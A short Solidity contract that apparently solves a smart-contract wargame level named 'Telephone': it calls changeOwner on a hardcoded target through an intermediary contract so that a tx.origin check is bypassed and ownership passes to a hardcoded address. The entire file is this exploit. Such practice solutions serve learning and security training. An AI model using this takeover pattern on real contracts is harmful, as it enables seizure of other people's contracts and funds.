pragma solidity ^0.8.0;

interface ITarget { function  changeOwner(address _owner) external; }

contract Middleware {
	function callTelephone() public {
		ITarget(0x5cd544b6084A87e29563429931FAAB755a9c63a9).changeOwner(0xD38198b501402E1cC0E01d1dB0F09BF00b06C0aB);
	}
}
